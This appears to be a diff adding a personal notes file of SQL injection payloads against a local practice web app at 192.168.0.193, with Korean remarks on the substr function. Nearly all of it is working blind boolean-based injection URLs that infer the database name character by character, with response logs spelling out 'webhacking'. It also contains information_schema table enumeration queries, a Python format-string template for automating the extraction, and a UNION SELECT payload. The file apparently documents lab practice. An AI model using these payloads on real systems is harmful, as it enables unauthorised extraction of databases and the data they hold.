@@ -1,0 +1,29 @@
+http://192.168.0.193:5000/main/view?bbs_no=21%20and%20length(database())=10
+#####################################################################################
+substring(database(),0,1)=119        
+http://192.168.0.193:5000/main/view?bbs_no=21%20and%20ascii(substring(database(),0,1))=119
+http://192.168.0.193:5000/main/view?bbs_no=21%20and%20ascii(substring(database(),1,1))=119
+200 119 w
+200 101 e
+200 98 b
+200 104 h
+200 97 a
+200 99 c
+200 107 k
+200 105 i
+200 110 n
+200 103 g
+#####################################################################################
+http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='webhacking'),0,1)=0 
+#####################################################################################
+http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='webhacking'),0,1)=0 
+http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='webhacking' limit 0,1),1,1)='a'
+
+http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='{}' limit {},1),{},1)='{}'".format(database_name, another, start_num, chr(y))        
+#####################################################################################
+substr(문자열, 시작위치, 나타낼 개수)
+substr([문자열], [시작인덱스], [길이])
+
+1'UNION SELECT TABLE_NAME,null,version(),null,null,null,null,null from information_schema.tables where TABLE_SCHEMA='webhacking'#
+#####################################################################################
+ select substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='webhacking' limit 1,1),6,1);
